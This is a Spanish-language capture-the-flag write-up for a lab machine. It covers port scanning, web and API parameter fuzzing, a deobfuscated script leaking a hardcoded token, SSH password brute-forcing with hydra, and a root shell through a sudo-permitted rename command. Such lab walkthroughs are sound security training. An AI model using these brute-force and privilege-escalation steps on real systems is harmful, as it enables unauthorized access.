Empezamos haciendo un escaneo básico de puertos:

```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn 192.168.1.69
```

Y vemos los puertos 80, 22 y 3000

En la página web del puerto 80 no vemos nada. Vamos a fuzzearla con gobuster:

```
gobuster dir -u http://192.168.1.69/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

Nos encuentra "script.js", que al verlo es un código ofuscado de javascript. Al desofuscarlo vemos lo siguiente:

```
function inicializarAplicacion()
	{
	const API_KEY_SECRETA=configParts.map(part=>part.toLowerCase()).join('');
	const appConfig=
		{
		version:'1.0.3',entorno:'produccion',apiEndpoint:'https://adivinaadivinanza/v3',credenciales:
			{
			usuario:'jeje',acceso:API_KEY_SECRETA.split('').reverse().join('')+'123'.split('').reverse().join('')
		}
		,features:
			{
			darkMode:true,analytics:false
		}
	};
	const conectarAPI=()=>
		{
		const claveFinal=appConfig.credenciales.acceso.slice(0,-3).split('').reverse().join('');
		console.log('Conectando a la API con clave:',claveFinal);
		return
			{
			status:200,message:'ConexiÃ³n exitosa',token:btoa(claveFinal+':'+'admin')
		}
	};
	if(window.location.hostname==='secretazosecreton')
		{
		setTimeout(()=>
			{
			const conexion=conectarAPI();
			console.log('Resultado conexiÃ³n:',conexion)
		}
		,3000)
	}
}
document.addEventListener('DOMContentLoaded',()=>
	{
	inicializarAplicacion();
	const buttons=document.querySelectorAll('button');
	buttons.forEach(btn=>
		{
		btn.addEventListener('click',()=>
			{
			console.log('BotÃ³n clickeado')
		}
		)
	}
	)
}
);
function validarClave(a)
	{
	const claveReal='QWERTYCHOCOLATITOCHOCOLATONCHINGON';
	return a===claveReal
}
if(typeof module!=='undefined'&&module.exports)
	{
	module.exports=
		{
		validarClave
	}
}
```

Algo nos servirá en el futuro. A continuación vamos a ver el puerto 3000. Vemos una página en blando que pone:

```
Cannot GET /
```

Se puede tratar de una api. Vamos a hacer fuzzing a esa ruta:

```
gobuster dir -u http://192.168.1.69:3000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

Y el resultado es este:

```
/view                 (Status: 400) [Size: 22]
/public               (Status: 301) [Size: 156] [--> /public/]
/api                  (Status: 400) [Size: 34]
```

Si nos dirigimos a /api vemos lo siguiente:

```
error: "parámetro incorrecto"
```


Y haciendo pruebas del tipo:

```
http://192.168.1.69:3000/api?test
```

Nos sale lo mismo, vamos a fuzzear esa api para ver si encontramos la palabra correcta:

```
wfuzz -c --hh=33  -u 'http://192.168.1.69:3000/api?FUZZ=prueba' -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

Y nos encuentra:

```
000016987:   401        0 L      2 W        26 Ch       "token" 
```

"token", sería la key para poder encontrar algo más allá. 

Anteriormente, en el script.js que hemos sacado, nos daba la palabra: "QWERTYCHOCOLATITOCHOCOLATONCHINGON", que la usaremos con la key que hemos sacado con wfuzz:

```
http://192.168.1.69:3000/api?token=QWERTYCHOCOLATITOCHOCOLATONCHINGON
```

Y el resultado es:

```
key : "MI-KEY-SECRETA-12345"
```

Esta key la usaremos en el directorio "view" que hemos sacado antes con gobuster:

```
http://192.168.1.69:3000/view?key=MI-KEY-SECRETA-12345
```

Y el resultado es una página web, donde nos indica que nos conectemos por ssh con el usuario debian. Haremos fuerza bruta para conseguir la contraseña:

```
hydra -l debian -P /usr/share/seclists/rockyou.txt ssh://192.168.1.69 

[22][ssh] host: 192.168.1.69   login: debian   password: chocolate
```

Conseguimos el acceso a la máquina víctima por ssh y leemos la flag de debian

ESCALADA DE PRIVILEGIOS

Ejecutamos sudo -l y nos sale:

```
sudo -l
Matching Defaults entries for debian on OfusPingu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User debian may run the following commands on OfusPingu:
    (ALL) NOPASSWD: /usr/bin/rename
```

Este binario significa que podemos ejecutar el comando rename para modificar cualquier archivo como root. Así que vamos a ello

Empezamos creando un archivo llamado "testfile" y posteriormente:

```
sudo /usr/bin/rename -e 'system("/bin/bash")' testfile
```

Esto ejecuta /bin/bash como root y .. finalmente pwned ;)